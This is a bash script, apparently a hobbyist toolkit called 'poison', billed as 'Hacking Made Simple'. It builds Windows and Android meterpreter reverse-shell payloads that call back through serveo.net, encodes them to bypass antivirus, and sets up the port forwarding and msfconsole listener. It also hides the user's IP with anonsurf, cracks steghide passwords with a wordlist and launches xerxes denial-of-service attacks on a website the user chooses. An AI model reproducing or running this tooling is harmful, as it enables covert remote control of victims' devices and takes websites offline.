#!/bin/bash
clear
clr2eol=`tput el`                              
echo -e  "      __               , _    
       /\_\/o    ()     /|/ \   
   _  |    |     /\  __  |   |  
 |/ \_|    ||   /  \/  \_|   |  
 |__/  \__/ |_//(__/\__/ |   |_/
/|                              
\|   **!!!!!!!!!Hacking Made Simple***********************!!!!!!!!!!!!!!!!!!!!!!"
sleep 1
echo -n -e "\r${clr2eol} *********!!!!!!!!!Hacking Made Simple***********************!!!!!!!!!!!!!!!!!!!!!!"
sleep 1
echo -n -e "\r${clr2eol} *************!!!!!!!!!!!!!!!!Hacking Made Simple******************!!!!!!!!!!!!!!!!"
sleep 1
echo -n -e "\r${clr2eol} *************************!!!!!!!!!!!!!!!!!!!!!!Hacking Made Simple*******!!!!!!!!!"
sleep 1
echo -n -e "\r${clr2eol} ***********************************!!!!!!!!!!!!!!!!!!!!!!!!!!Hacking Made Simple**"
sleep 3
echo -n -e "\r${clr2eol}////////////******SCRIPT BY******//////////"
sleep 3
echo -n -e "\r${clr2eol}////////////******MITESH WANI*******/////// "
sleep 3
echo -n -e "\r${clr2eol}////////////******DEVELOPED FOR*******/////// "
sleep 2
echo -n -e "\r${clr2eol}////////////******EDUCATIONAL PURPOSE******////// "
sleep 2
echo -n -e "\r${clr2eol}////////////******FOR ANY ISSUES AND REPORTS******///// "
sleep 3
echo -n -e "\r${clr2eol}///////////********VISIT GITHUB.COM/MITESHW05/POISON********//////"
sleep 4
ACTUAL="THERE WE ARE"
read pass
if [ "$pass" != "$ACTUAL" ]
 then 
 echo "Sorry!! Please check the password again or else contact me on miteshw05@gmail.com"
 exit 
 else
 echo "Amazing, Password is correct!!!!"
fi
sleep 3
echo -n -e "\r${clr2eol}///////////********CHECKING FOR FILES********//////"
sleep 2
 if [ -d "ngrok-linux-stable-amd64" ]
then
echo "ngrok installed OK!!!(JUST CLOSE THE NEWLY OPENED TERMINAL)"
else
echo "ngrok is not installed"
fi
echo -n -e "\r${clr2eol}//////////*********STARTING***********///////// "
sleep 1
echo -n -e "\r${clr2eol}**************\n  "
sleep 1
echo -n -e "\r${clr2eol}*********************************\n "
sleep 1
echo -n -e "\r${clr2eol}***********************************************************\n "
sleep 1
echo -n -e "\r${clr2eol}****************************************************************************\n "
sleep 1
echo -n -e "\r${clr2eol}************************************************************************************************ \n"
sleep 1
echo -n -e "\r${clr2eol}************************************************************************************************************ \n"
sleep 1
echo -n -e "\r${clr2eol}***************************************************************************************************************************** \n"
sleep 1
while true; do
  echo -e "\n\t\t1.Payload Tools\t\t2.IP Tools\n\t\t3.Steganography Tools\t\t4.Check For Updates\t\t5.DOS Attacks"
 read m
 case $m in
	[1]* )
while true; do
  echo -e "\n\t\t\t1.Build The Virus!!!\n\t\t\t2.Start Port Forwarding\n\t\t\t3.Start Listening\n"
 read s
 case $s in 
	[1]* )
echo -e "\tGive me the victim operating system\n\t\t1.windows\n\t\t2.android"
read t
echo -e "\tGive me the listening port(lport)"
read p
echo -e "\tWhat should be the name of your file??"
read n
name=$1
set 'who am i'
while true; do
    echo -e "\tWanna Encode File(For Bypassing Antivirus)??\n\t\t1.Yess Please\n\t\t2.Naah!! I don't worry" 
   read y
    case $y in
        [1]* ) 
if [ $t -eq 2 ]
 then
 o='android'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -e x86/shikata_ga_nai -i 2000 lport=$p -o /root/Desktop/$n.apk
else 
 o='windows'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -e x86/shikata_ga_nai -i 2000  -o /root/Desktop/$n.exe
fi; break;;
        [2]* ) 
if [ $t -eq 2 ]
 then
 o='android'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -o /root/Desktop/$n.apk
else 
 o='windows'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p  -o /root/Desktop/$n.exe
fi; break;;
        * ) echo "Please answer 1 or 2";;
    esac
done

echo -e "\t\t\tDone!!! Check your Desktop for file HAPPY HACKING@@@"
while true; do
    read -p "Wanna Start Port Forwarding(y/n) " g
    case $g in
        [Yy]* ) echo -e "\n\tWell a good Choice , Wait for a moment"
		gnome-terminal -- ssh -R $p:localhost:$p serveo.net
		echo -e "\n\t\tDone, check the new terminal for details"; break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done
while true; do
    read -p "Wanna Start Listening(y/n) " yn
    case $yn in
        [Yy]* )
	gnome-terminal -- msfconsole -x "use multi/handler;set payload $o/meterpreter/reverse_tcp;set lhost serveo.net;set lport $p;exploit"
	echo "Thanks For using the script!!!"
	sleep 5; break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done; break;;
  	[2]* )
	echo "Give me the port no."
	read p
	ssh -R $p:localhost:$p serveo.net
	echo -e "\nDONE!!!"; break;;
	[3]* )
	echo "Give me the port no."
	read p
	echo "Select the operating system(windows/android)"
	read o 
	msfconsole -x "use multi/handler;set payload $o/meterpreter/reverse_tcp;set lhost serveo.net;set lport $p;exploit"; break;;
 	* ) echo "Please Select Correct option"; break;;
    esac
	done; break;;
	[2]* )
	clear
	while true; do
  echo -e "\n\t\t 1.What's My IP\n\t\t2.Hide My IP\n\t\t3.UnHide My  IP"
 read i
 case $i in 
	[1]* )
	echo "Well So Let me check your IP......."
	sleep 2
 	echo -e "\nOkay so your IP is" 
	wget  http://ip-api.com/json
	cat json
	sleep 10
	rm json; break;;
	[2]* )
	echo -e "\nOKAY HIDING YOUR IP...(it will work only when nipe is installed (if not installed , just install it)"
	cd
	if [ -d "kali-anonsurf" ] 
	then
	echo "Ok anonsurf is installed"
	else
	echo "Anonsurf is not installed , installing now"
	sleep 2
	git clone https://github.com/Und3rf10w/kali-anonsurf
	cd kali-anonsurf
	./installer.sh
	fi
	anonsurf start
	anonsurf status
	cd
	cd poison;
	 break;;
	[3]* )
	echo -e "\nOKAY UNHIDING YOUR IP...(it will work only when nipe is installed (if not installed , just install it)"
	cd
	if [ -d "kali-anonsurf" ] 
	then
	echo "Ok anonsurf is installed"
	else
	echo "Anonsurf is not installed , installing now"
	sleep 2
	cd
	git clone  https://github.com/Und3rf10w/kali-anonsurf
	cd kali-anonsurf
	./installer.sh
	fi
	anonsurf stop
	anonsurf status
	cd
	cd poison;
	 break;;  
	* ) echo "Please Select Correct option"; break;;
    esac
done; break;;
	[3]* )
	clear
	while true; do
  echo -e "\n\t\t\t1.Hide Image\t\t\t2.Unhide Image"
read z
 case $z in 
	[1]* )
	echo "Checking for programs installed...."
	sleep 2
	dpkg -l 'steghide'
	if [ $? -eq 0 ];
	then
	sleep 3
	echo "Yepp!! Steghide is already installed"
	else
	sleep 3
	echo "No worries Installing it for you...."
	sleep 3
	apt-get -qq install steghide
fi 
	sleep 3
	echo "Copy the files in the poison directory"
	sleep 5
	echo "Enter the name of your file with extension (eg.lol.jpg) you wanna hide details in"
	read cover_file
	sleep 1
	echo "Enter the name of your secret file"
	read secret_file
	sleep 2
	steghide -q embed -cf $cover_file -ef $secret_file
	sleep 3
	if [ $? -eq 0 ];
	then
	sleep 3
	echo "Congrats!! File is saved on the Disk"
	else
	sleep 3
	echo "AAh Sorry Some Error Occured...Try checking name of the files."
	sleep 3
	fi  ; break;;
	[2]* )
	while true; do
	read -p "Do you Have Password for the file??(y/n)" lf
case $lf in
        [Yy]* )
		echo "That's good"
	sleep 2
	echo "Please!! Copy The File To Poison Directory"
	sleep 5
	echo "Enter the File Name"
	read file
	steghide extract -sf $file
	sleep 3
	echo "Congrats!! File has been extracted" ; break;;
	[Nn]* )
	echo "Checking For The Program"
	if [ -d "steg-unhide" ] 
	then
	echo "Program is already installed"
	else
	echo "Installing Program for you"
	mkdir steg-unhide
	wget -q https://raw.githubusercontent.com/Paradoxis/StegCracker/master/stegcracker
	chmod +x stegcracker
	mv stegcracker /steg-unhide
	fi
	cd steg-unhide
	echo "Enter the file name"
	read unhide
	mv /root/poison/$unhide /root/poison/steg-unhide
	git clone https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
	tar -xzvf rockyou.txt.tar.gz
	stegcracker $unhide rockyou.txt
	sleep 2 ; break;;
	* ) echo "Please Select correct value" ; break;;
esac

done; break;;
	* ) echo "Select Proper Value"; break;;
esac 
done; break;;
	[4]* ) echo "Checking for updates"
	sleep 3
wget -q  --spider https://github.com/miteshw05/poison/blob/master/poison%20V1.4.sh
if [ $? -eq 0 ];
	then
	sleep 2
	echo "New Update Available,Installing it now"
	 cd
	rmdir /root/poison
	git clone https://github.com/miteshw05/poison
	cd poison
	chmod +x 'poison V1.4.sh'
	sleep 2
	
 else 
	echo "Great!!! Script is Already Updated"
	sleep 5
fi; break;;
	[5]* ) echo -n -e "\r${clr2eol}Checking For Programs Installation.."
		sleep 1
		echo -n -e "\r${clr2eol}Checking For Programs Installation........"
		sleep 1
		echo -n -e "\r${clr2eol}Checking For Programs Installation.................."
		if [ -d "xerxes" ]
then
		sleep 2
		echo "Program is already installed"
		sleep 2
		else
		echo "Program is not installed..Installing it for you"
		sleep 2
		git clone https://github.com/zanyarjamal/xerxes
		cd xerxes
		gcc xerxes.c -o xerxes
		fi
		echo "Enter The Website"
		read website
		sleep 1
		echo "checking your IP before starting attack\n"
		sleep 3
	 	wget -q  http://ip-api.com/json
		echo "Please see the IP and location carefully"
		sleep 2
		cat json
		sleep 5
		rm json
		echo "\n\n"
		clear
		echo "\n\nIt's Highly suggested to check your Ip and location, if it's real click ctrl+C within 10 seconds and start the script, select IP tools and Hide your IP"
		sleep 20
		 cd xerxes
		 ./xerxes $website 80
		echo "Thanks For Using The Script"
		sleep 5; break;;
esac
done 

